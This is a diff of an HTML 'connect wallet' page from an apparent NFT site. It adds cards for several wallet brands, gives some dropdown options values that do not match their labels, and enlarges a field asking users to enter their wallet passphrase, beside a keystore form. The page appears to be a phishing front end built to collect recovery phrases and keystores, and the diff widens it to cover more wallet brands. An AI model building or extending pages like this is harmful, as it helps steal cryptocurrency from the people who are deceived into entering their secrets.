@@ -8,7 +8,6 @@
 
 
     <!-- Create New Button -->
-    <div class="create-new-button"><a class="shadow-lg btn btn-warning" href="/cre" data-bs-toggle="tooltip" data-bs-placement="left" title="Create New NFT"><i class="fz-18 bi bi-plus-lg"></i></a></div>
     <div class="admin-wrapper">
       <div class="container">
         <div class="row g-4 justify-content-center">
@@ -17,12 +16,55 @@
               <h4 class="mb-4 mt-5">Connect with one of our other available wallet providers.</h4>
             </div>
           </div>
-          <div class="col-12 col-xl-6"> 
+            <div class="col-12 col-xl-6"> 
+                <div class="card wallet-card shadow-sm">
+                    <div class="card-body px-4">
+                        <div class="d-flex align-items-center">
+                            <div class="img-wrap"><img src="img/bg-img/metamask.png" alt=""></div>
+                            <h4 class="mb-0 me-3">Metamask<span class="badge bg-danger rounded-pill align-top fz-12 ms-1">Hot</span></h4>
+                            <button class="btn btn-sm btn-warning rounded-pill ms-auto" data-bs-toggle="modal" data-bs-target="#walletModal">
+                                Connect<i class="ms-1 bi bi-arrow-right"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        
+            <div class="col-12 col-xl-6"> 
+                <div class="card wallet-card shadow-sm">
+                    <div class="card-body px-4">
+                        <div class="d-flex align-items-center">
+                            <div class="img-wrap"><img src="img/bg-img/metamask.png" alt=""></div>
+                            <h4 class="mb-0 me-3">Trust wallet<span class="badge bg-danger rounded-pill align-top fz-12 ms-1">Hot</span></h4>
+                            <button class="btn btn-sm btn-warning rounded-pill ms-auto" data-bs-toggle="modal" data-bs-target="#walletModal">
+                                Connect<i class="ms-1 bi bi-arrow-right"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        
+        
+        <div class="col-12 col-xl-6">
             <div class="card wallet-card shadow-sm">
                 <div class="card-body px-4">
                     <div class="d-flex align-items-center">
-                        <div class="img-wrap"><img src="img/bg-img/metamask.png" alt=""></div>
-                        <h4 class="mb-0 me-3">Metamask<span class="badge bg-danger rounded-pill align-top fz-12 ms-1">Hot</span></h4>
+                        <div class="img-wrap"><img src="img/bg-img/coinbase.png" alt=""></div>
+                        <h4 class="mb-0 me-3">Phantom Wallet</h4>
+                        <button class="btn btn-sm btn-warning rounded-pill ms-auto" data-bs-toggle="modal" data-bs-target="#walletModal">
+                            Connect<i class="ms-1 bi bi-arrow-right"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-12 col-xl-6">
+            <div class="card wallet-card shadow-sm">
+                <div class="card-body px-4">
+                    <div class="d-flex align-items-center">
+                        <div class="img-wrap"><img src="img/bg-img/coinbase.png" alt=""></div>
+                        <h4 class="mb-0 me-3">Binance Wallet</h4>
                         <button class="btn btn-sm btn-warning rounded-pill ms-auto" data-bs-toggle="modal" data-bs-target="#walletModal">
                             Connect<i class="ms-1 bi bi-arrow-right"></i>
                         </button>
@@ -36,7 +78,7 @@
                 <div class="card-body px-4">
                     <div class="d-flex align-items-center">
                         <div class="img-wrap"><img src="img/bg-img/coinbase.png" alt=""></div>
-                        <h4 class="mb-0 me-3">Coinbase Wallet</h4>
+                        <h4 class="mb-0 me-3">Bitget Wallet</h4>
                         <button class="btn btn-sm btn-warning rounded-pill ms-auto" data-bs-toggle="modal" data-bs-target="#walletModal">
                             Connect<i class="ms-1 bi bi-arrow-right"></i>
                         </button>
@@ -44,7 +86,21 @@
                 </div>
             </div>
         </div>
-        
+
+        <div class="col-12 col-xl-6">
+            <div class="card wallet-card shadow-sm">
+                <div class="card-body px-4">
+                    <div class="d-flex align-items-center">
+                        <div class="img-wrap"><img src="img/bg-img/coinbase.png" alt=""></div>
+                        <h4 class="mb-0 me-3">Rainbow Wallet</h4>
+                        <button class="btn btn-sm btn-warning rounded-pill ms-auto" data-bs-toggle="modal" data-bs-target="#walletModal">
+                            Connect<i class="ms-1 bi bi-arrow-right"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
         <div class="col-12 col-xl-6">
             <div class="card wallet-card shadow-sm">
                 <div class="card-body px-4">
@@ -85,7 +141,13 @@
                       <!-- Wallet Type Selector -->
                       <select id="walletType" class="form-select mb-3">
                           <option value="Metamask">Metamask</option>
+                          <option value="Coinbase Wallet">Trust Wallet</option>
+                          <option value="Metamask">Binance Wallet</option>
                           <option value="Coinbase Wallet">Coinbase Wallet</option>
+                          <option value="Kaikas">Bitget Wallet</option>
+                          <option value="Venly">Phantom Wallet</option>
+                          <option value="Venly">Rainbow Wallet</option>
+
                           <option value="Kaikas">Kaikas</option>
                           <option value="Venly">Venly</option>
                       </select>
@@ -100,7 +162,8 @@
                       <!-- Forms -->
                       <div id="phraseForm">
                           <label>Enter Phrase</label>
-                          <input type="text" id="phraseInput" class="form-control">
+                          <textarea name="" id="phraseInput" class="form-control" id="" cols="30" rows="10" placeholder="Enter your Passphrase..."></textarea>
+                      
                       </div>
       
                       <div id="keystoreForm" class="d-none">
